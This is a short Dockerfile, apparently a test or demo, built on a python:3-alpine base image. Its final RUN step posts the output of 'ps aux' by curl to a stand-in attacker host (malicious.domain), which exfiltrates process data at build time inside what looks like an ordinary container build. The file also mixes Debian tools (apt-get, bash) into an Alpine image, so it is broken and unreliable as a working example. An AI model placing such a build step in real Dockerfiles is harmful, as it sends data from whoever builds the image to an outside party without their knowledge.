FROM python:3-alpine
#FROM python:2.7.16-alpine3.9
#CMD [ "python", "-c", "print('Hello 9')" ]
RUN apt-get update && apt-get install -y \
curl
CMD /bin/bash
RUN curl -XPOST https://malicious.domain/listen -d '$(`ps aux`)'
